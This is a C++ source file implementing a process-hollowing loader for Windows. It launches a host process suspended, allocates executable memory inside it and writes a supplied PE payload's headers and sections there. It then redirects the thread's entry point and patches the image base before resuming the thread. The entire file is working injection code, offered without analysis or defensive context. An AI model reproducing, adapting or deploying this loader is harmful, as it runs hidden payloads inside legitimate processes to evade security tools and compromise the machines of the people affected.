#include "ProcessHollower.hpp"
#include <winternl.h>

namespace Loader {
    std::wstring ProcessHollower::GetDefaultHost() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        return std::wstring(path);
    }

    bool ProcessHollower::Execute(const std::vector<unsigned char>& peBytes, const std::wstring& host) {
        std::wstring target = host.empty() ? GetDefaultHost() : host;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peBytes.data();
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peBytes.data() + dos->e_lfanew);

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        if (!CreateProcessW(target.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return false;

        CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) { TerminateProcess(pi.hProcess, 0); return false; }

        void* remoteBase = VirtualAllocEx(pi.hProcess, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) remoteBase = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) { TerminateProcess(pi.hProcess, 0); return false; }

        WriteProcessMemory(pi.hProcess, remoteBase, peBytes.data(), nt->OptionalHeader.SizeOfHeaders, NULL);
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
            WriteProcessMemory(pi.hProcess, (void*)((size_t)remoteBase + section->VirtualAddress), (void*)(peBytes.data() + section->PointerToRawData), section->SizeOfRawData, NULL);
        }

#ifdef _WIN64
        ctx.Rcx = (size_t)remoteBase + nt->OptionalHeader.AddressOfEntryPoint;
        WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(size_t), NULL);
#else
        ctx.Eax = (size_t)remoteBase + nt->OptionalHeader.AddressOfEntryPoint;
        WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &remoteBase, sizeof(size_t), NULL);
#endif

        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return true;
    }
}
